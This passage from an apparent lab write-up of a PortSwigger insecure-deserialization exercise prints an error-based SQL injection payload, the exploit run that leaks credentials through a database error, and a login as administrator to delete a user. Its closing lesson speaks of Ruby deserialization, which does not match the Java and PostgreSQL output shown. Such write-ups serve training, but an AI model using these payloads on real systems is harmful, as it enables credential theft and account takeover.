Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,CAST((SELECT username||':'||password FROM users LIMIT 1 OFFSET 2) AS INT),NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:24:53
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "wiener:peter"
```

- Found `administrator` password: `cx84ygpvjtb4tjokq2sz`

**Let's login as user `administrator`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112192554.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112192605.png)

**Nice! I'm user `administrator`, let's go to the admin panel and delete user `carlos`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112192628.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112192636.png)

# What we've learned:

1. Exploiting Ruby deserialization using a documented gadget chain